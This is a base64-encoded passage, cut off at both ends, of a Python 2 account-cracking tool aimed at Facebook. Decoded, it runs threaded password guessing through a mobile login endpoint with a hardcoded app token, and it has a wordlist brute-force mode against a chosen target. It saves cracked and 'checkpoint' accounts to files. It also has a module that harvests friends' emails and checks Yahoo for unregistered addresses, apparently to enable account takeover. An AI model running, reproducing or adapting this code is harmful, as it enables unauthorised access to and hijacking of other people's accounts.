HBlbmQodXNlcitwYXNzNykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1Bhc3M4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyt1c2VyKycvP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIgPSBqc29uLmxvYWRzKGEudGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzOCA9ICJqYW51YXJ5IiwiZmVicnVhcnkiLCJtYXJjaCIsImFwcmlsIiwibWF5IiwianVuZSIsImp1bHkiLCJhdWd1c3QiLCJzZXB0ZW1iZXIiLCJub3ZlbWJlciIsImRlY2VtYmVyIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1MjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzOCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3M4KyIgPT4iK3pbJ25hbWUnXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlcitwYXNzOCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja19pdC53cml0ZSh1c2VyKyJ8IitwYXNzOCsiXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja19pdC5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczgpCgoJCWV4Y2VwdDoKCQkJcGFzcwoKCXAgPSBUaHJlYWRQb29sKDMwKQoJcC5tYXAobWFpbiwgaWQpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRG9uZSBcMDMzWzE7OTdtLi4uLicKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE9LL0NQIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK3N0cihsZW4ob2tzKSkrIlwwMzNbMTs5N20vXDAzM1sxOzkzbSIrc3RyKGxlbihjaGVja3BvaW50KSkKCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1DUCBGaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvb3V0cHV0LnR4dCIpCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJc3VwZXIoKQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiMjIyMjIEJSVVRFIEZPUkNFICMjIyMjCmRlZiBicnV0ZSgpOgoJZ2xvYmFsIGZiX3Rva2VuCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXRyeToKCQllbWFpbCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSURcMDMzWzE7OTdtL1wwMzNbMTs5Mm1FbWFpbFwwMzNbMTs5N20vXDAzM1sxOzkybUhwIFwwMzNbMTs5N21UYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgkJcGFzc3cgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVdvcmRsaXN0IFwwMzNbMTs5N21leHQobGlzdC50eHQpIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRvdGFsID0gb3BlbihwYXNzdywiciIpCgkJdG90YWwgPSB0b3RhbC5yZWFkbGluZXMoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1UYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrZW1haWwKCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWxcMDMzWzE7OTZtICIrc3RyKGxlbih0b3RhbCkpKyIgXDAzM1sxOzkybVBhc3N3b3JkIgoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXNhbmRpID0gb3BlbihwYXNzdywiciIpCgkJZm9yIHB3IGluIHNhbmRpOgoJCQl0cnk6CgkJCQlwdyA9IHB3LnJlcGxhY2UoIlxuIiwiIikKCQkJCXN5cy5zdGRvdXQud3JpdGUoIlxyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4py4XDAzM1sxOzkxbV0gXDAzM1sxOzkybUNyYWNrIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3B3KQoJCQkJc3lzLnN0ZG91dC5mbHVzaCgpCgkJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoZW1haWwpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCW1wc2ggPSBqc29uLmxvYWRzKGRhdGEudGV4dCkKCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6CgkJCQkJZGFwYXQgPSBvcGVuKCJCcnV0ZS50eHQiLCAidyIpCgkJCQkJZGFwYXQud3JpdGUoZW1haWwrIiB8ICIrcHcrIlxuIikKCQkJCQlkYXBhdC5jbG9zZSgpCgkJCQkJcHJpbnQgIlxuXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJCQkJcHJpbnQoIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWUgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrZW1haWwpCgkJCQkJcHJpbnQoIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrcHcpCgkJCQkJZXhpdCgpCgkJCQllbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWyJlcnJvcl9tc2ciXToKCQkJCQljZWtzID0gb3BlbigiQnJ1dGVjaGVja3BvaW50LnR4dCIsICJ3IikKCQkJCQljZWtzLndyaXRlKGVtYWlsKyIgfCAiK3B3KyJcbiIpCgkJCQkJY2Vrcy5jbG9zZSgpCgkJCQkJcHJpbnQgIlxuXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZSBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbCkKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykKCQkJCQlleGl0KCkKCQkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBDb25uZWN0aW9uIEVycm9yIgoJCQkJdGltZS5zbGVlcCgwLjAxKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikKCQl3b3JkbHN0KCkKZGVmIHdvcmRsc3QoKToKCXdoeSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtQ3JlYXRlIHdvcmRsaXN0ID8gXDAzM1sxOzkybVt5L25dXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglpZiB3aHkgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKCQl3b3JkbHN0KCkKCWVsaWYgd2h5ID09InkiOgoJCXdvcmRsaXN0KCkKCWVsaWYgd2h5ID09IlkiOgoJCXdvcmRsaXN0KCkKCWVsaWYgd2h5ID09Im4iOgoJCW1lbnVfaGFjaygpCgllbGlmIHdoeSA9PSJOIjoKCQltZW51X2hhY2soKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKCQl3b3JkbHN0KCkKCiMjIyMjIFlBSE9PIENIRUNLRVIgIyMjIyMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIG1lbnVfeWFob28oKToKCWdsb2JhbCBmYl90b2tlbgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBXaXRoIGxpc3QgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gQ2xvbmUgZnJvbSBmcmllbmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBDbG9uZSBmcm9tIG1lbWJlciBncm91cCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIFVzaW5nIGZpbGUiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIgoJcHJpbnQgIuKVkSIKCWNob29zZV95YWhvbygpCiMtLS0tY2hvaWNlcwpkZWYgY2hvb3NlX3lhaG9vKCk6CglnbyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQoJaWYgZ28gPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKCQljaG9vc2VfeWFob28oKQoJZWxpZiBnbyA9PSIxIjoKCQl5YWhvb2ZyaWVuZHMoKQoJZWxpZiBnbyA9PSIyIjoKCQl5YWhvb2Zyb21mcmllbmRzKCkKCWVsaWYgZ28gPT0iMyI6CgkJeWFob29tZW1iZXIoKQoJZWxpZiBnbyA9PSI0IjoKCQl5YWhvb2xpc3QoKQoJZWxpZiBnbyA9PSIwIjoKCQltZW51X2hhY2soKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKCQljaG9vc2VfeWFob28oKQoKIyMjIyMgTElTVCBGUklFTkQgIyMjIyMKZGVmIHlhaG9vZnJpZW5kcygpOgoJZ2xvYmFsIGZiX3Rva2VuCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCW1wc2ggPSBbXQoJamNzYiA9IDAKCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJpZW5kIFwwMzNbMTs5N20uLi4nKQoJZnJpZW5kcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCW1pdGNoeSA9IGpzb24ubG9hZHMoZnJpZW5kcy50ZXh0KQoJc2F2ZSA9IG9wZW4oJ291dC9NYWlsVnVsbi50eHQnLCd3JykKCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgdyBpbiBtaXRjaHlbJ2RhdGEnXToKCQlqY3NiICs9MQoJCW1wc2guYXBwZW5kKGpjc2IpCgkJaWQgPSB3WydpZCddCgkJZmJfbmFtZSA9IHdbJ25hbWUnXQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkKCQl0cnk6CgkJCW1haWwgPSB6WydlbWFpbCddCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoKCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikKCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsCgkJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQkJc2VhdCA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBpY2tzID0gc2VhdC5zZWFyY2goY2xpY2spLmdyb3VwKCkKCQkJCWV4Y2VwdDoKCQkJCQljb250aW51ZQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBpY2tzOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IitmYl9uYW1lKQoJCQkJCXN1Y2Vzc2Z1bC5hcHBlbmQobWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihzdWNlc3NmdWwpKQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L01haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoKIyMjIyMgQ0xPTkUgRlJPTSBGUklFTkQgIyMjIyMKZGVmIHlhaG9vZnJvbWZyaWVuZHMoKToKCWdsb2JhbCBmYl90b2tlbgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCgltcHNoID0gW10KCWpjc2IgPSAwCglpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCXRyeToKCQlzZWF0ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCW9wID0ganNvbi5sb2FkcyhzZWF0LnRleHQpCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfeWFob28oKQoJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0dGluZyBlbWFpbCBmcm9tIGZyaWVuZCBcMDMzWzE7OTdtLi4uJykKCWZyaWVuZHMgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCW1pdGNoeSA9IGpzb24ubG9hZHMoZnJpZW5kcy50ZXh0KQoJc2F2ZSA9IG9wZW4oJ291dC9GcmllbmRNYWlsVnVsbi50eHQnLCd3JykKCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgdyBpbiBtaXRjaHlbJ2RhdGEnXToKCQlqY3NiICs9MQoJCW1wc2guYXBwZW5kKGpjc2IpCgkJaWQgPSB3WydpZCddCgkJZmJfbmFtZSA9IHdbJ25hbWUnXQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkKCQl0cnk6CgkJCW1haWwgPSB6WydlbWFpbCddCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoKCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikKCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsCgkJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQoJCQkJc2VhdCA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBpY2tzID0gc2VhdC5zZWFyY2goY2xpY2spLmdyb3VwKCkKCQkJCWV4Y2VwdDoKCQkJCQljb250aW51ZQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBpY2tzOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IitmYl9uYW1lKQoJCQkJCXN1Y2Vzc2Z1bC5hcHBlbmQobWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihzdWNlc3NmdWwpKQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoKIyMjIyMgWUFIT08gTUVNQkVSICMjIyMjCmRlZiB5YWhvb21lbWJlcigpOgoJZ2xvYmFsIGZiX3Rva2VuCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0Z